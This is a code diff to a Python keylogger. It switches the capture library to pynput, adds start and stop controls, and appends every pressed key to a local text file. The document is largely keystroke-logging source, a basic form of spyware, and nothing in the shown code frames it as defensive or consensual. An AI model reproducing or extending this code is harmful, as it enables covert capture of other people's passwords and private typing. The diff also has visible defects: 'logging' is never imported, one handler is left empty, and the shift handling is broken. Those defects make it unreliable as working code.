@@ -1,10 +1,11 @@
 import time
-import keyboard
+from pynput import keyboard
 
 class appstart:
     path = "fileKeyLog.txt"
     caps = 0
     shift = 0
+    running = True
 
     @staticmethod
     def strLog():
@@ -12,82 +13,53 @@ class appstart:
             return file.read()
 
 class InterceptKeys:
+    listener = None
+
     @staticmethod
     def startKLog():
-        keyboard.hook(InterceptKeys.on_key)
-        keyboard.wait()
+        print("Start")
+        appstart.running = True
+        InterceptKeys.listener.start()
 
     @staticmethod
-    def on_key(event):
-        if event.event_type == "down":
-            vkCode = event.scan_code
+    def stopKLog():
+        print("Stop")
+        appstart.running = False
+        if InterceptKeys.listener is not None:
+            InterceptKeys.listener.stop()
 
+    @staticmethod
+    def onKeyRelease(key):
+        print("Key release")
+        # if InterceptKeys.listener is not None and appstart.running is False:
+            
+
+    @staticmethod
+    def onKeyPress(key):
+        print("Key press")
+        if (appstart.running is False):
+            return False
+        try:
             with open(appstart.path, "a") as file:
-                if keyboard.is_pressed("shift"):
-                    appstart.shift = 1
-
-                if event.name == "space":
+                if key == keyboard.Key.space:
                     file.write(" ")
-                elif event.name == "enter":
+                elif key == keyboard.Key.enter:
                     file.write("Enter\n")
-                elif event.name == "backspace":
+                elif key == keyboard.Key.backspace:
                     file.write("Backspace")
-                elif event.name == "tab":
+                elif key == keyboard.Key.tab:
                     file.write("Tab")
-                elif event.name == "0":
-                    file.write("0" if appstart.shift == 0 else ")")
-                elif event.name == "1":
-                    file.write("1" if appstart.shift == 0 else "!")
-                elif event.name == "2":
-                    file.write("2" if appstart.shift == 0 else "@")
-                elif event.name == "3":
-                    file.write("3" if appstart.shift == 0 else "#")
-                elif event.name == "4":
-                    file.write("4" if appstart.shift == 0 else "$")
-                elif event.name == "5":
-                    file.write("5" if appstart.shift == 0 else "%")
-                elif event.name == "6":
-                    file.write("6" if appstart.shift == 0 else "^")
-                elif event.name == "7":
-                    file.write("7" if appstart.shift == 0 else "&")
-                elif event.name == "8":
-                    file.write("8" if appstart.shift == 0 else "*")
-                elif event.name == "9":
-                    file.write("9" if appstart.shift == 0 else "(")
-                elif event.name in ["lshift", "rshift", "lctrl", "rctrl", "lalt", "ralt", "lwin", "rwin", "apps"]:
-                    pass
-                elif event.name == "/":
-                    file.write("/" if appstart.shift == 0 else "?")
-                elif event.name == "[":
-                    file.write("[" if appstart.shift == 0 else "{")
-                elif event.name == "]":
-                    file.write("]" if appstart.shift == 0 else "}")
-                elif event.name == ";":
-                    file.write(";" if appstart.shift == 0 else ":")
-                elif event.name == "'":
-                    file.write("'" if appstart.shift == 0 else '"')
-                elif event.name == ",":
-                    file.write("," if appstart.shift == 0 else "<")
-                elif event.name == ".":
-                    file.write("." if appstart.shift == 0 else ">")
-                elif event.name == "-":
-                    file.write("-" if appstart.shift == 0 else "_")
-                elif event.name == "=":
-                    file.write("=" if appstart.shift == 0 else "+")
-                elif event.name == "`":
-                    file.write("`" if appstart.shift == 0 else "~")
-                elif event.name == "\\":
-                    file.write("|")
-                elif event.name == "caps lock":
-                    appstart.caps = 1 if appstart.caps == 0 else 0
+                elif key == keyboard.Key.caps_lock:
+                    appstart.caps = not appstart.caps
+                elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
+                    appstart.shift = True
                 else:
-                    if appstart.shift == 0 and appstart.caps == 0:
-                        file.write(event.name.lower())
-                    elif appstart.shift == 1 and appstart.caps == 0:
-                        file.write(event.name.upper())
-                    elif appstart.shift == 0 and appstart.caps == 1:
-                        file.write(event.name.upper())
-                    elif appstart.shift == 1 and appstart.caps == 1:
-                        file.write(event.name.lower())
-
-                appstart.shift = 0
+                    if hasattr(key, "char"):
+                        char = key.char
+                        if appstart.shift or appstart.caps:
+                            char = char.upper()
+                        else:
+                            char = char.lower()
+                        file.write(char)
+        except Exception as e:
+            logging.exception(e)
